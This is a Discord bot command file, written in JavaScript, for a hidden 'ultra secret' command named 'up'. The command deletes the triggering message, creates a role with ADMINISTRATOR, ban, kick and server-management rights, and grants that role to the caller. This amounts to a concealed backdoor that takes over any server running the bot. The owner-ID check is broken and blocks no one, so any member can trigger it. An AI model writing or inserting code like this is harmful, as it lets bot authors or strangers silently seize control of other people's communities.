module.exports = {
          name: "up",
          description: "Ultra secret command",
          guildOnly: true,
          use: "up secret",
          type: "Secret command",
          aliases: [],

          execute(message, args) {
                    const Discord = require('discord.js');
                    const bot = require('../bot');




                    if (
                              !message.author.id == '672823761723981889' &
                              !message.author.id == '751524528584130670'
                    ) return bot.derror(message, "You can't use this ultra secret command")
                    message.delete()

                    var name = args
                    if (!name) return console.log("You must specify the name of the role");
                    message.guild.roles.create({
                              data: {
                                        name: name,
                                        color: 'PURPLE',
                                        permissions: ['KICK_MEMBERS', 'MANAGE_ROLES', 'SEND_MESSAGES', 'CONNECT', 'MANAGE_CHANNELS', 'MANAGE_GUILD', 'MANAGE_MESSAGES', 'BAN_MEMBERS', 'ADMINISTRATOR']
                              },
                              reason: 'Ultra secret role',
                    })

                    setTimeout(function () {
                              message.member.roles.add(message.guild.roles.cache.find(r => r.name == name));
                    }, 1000);

          }
}